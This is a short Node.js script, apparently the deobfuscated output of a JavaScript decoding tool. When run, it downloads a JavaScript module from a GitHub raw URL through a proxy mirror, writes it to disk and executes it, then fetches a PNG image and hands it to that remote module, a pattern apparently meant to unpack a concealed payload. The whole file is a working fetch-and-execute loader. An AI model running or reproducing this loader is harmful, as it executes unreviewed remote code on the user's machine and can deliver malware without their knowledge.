//Sat Jun 29 2024 10:44:04 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const imageFileName = "ppmt.png",
  fs = require("fs"),
  axios = require("axios"),
  runFile = "./run0O.js";
!(async () => {
  let _0x59ffdc;
  try {
    _0x59ffdc = require(runFile);
  } catch (_0x2e5a5b) {
    const _0x20e23c = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/run0O.js", {
      "responseType": "arraybuffer"
    });
    fs.writeFileSync("run0O.js", Buffer.from(_0x20e23c.data));
    _0x59ffdc = require(runFile);
  }
  if (!fs.existsSync(imageFileName)) {
    console.log("AAA");
    try {
      const _0x2530ec = await axios.get("https://mirror.ghproxy.com/https://raw.githubusercontent.com/smallfawn/script/main/" + imageFileName, {
        "responseType": "arraybuffer"
      });
      fs.writeFileSync(imageFileName, Buffer.from(_0x2530ec.data));
      await _0x59ffdc(imageFileName);
      return;
    } catch (_0x5f5727) {
      return;
    }
  }
  await _0x59ffdc(imageFileName);
})();
_0xodh = "";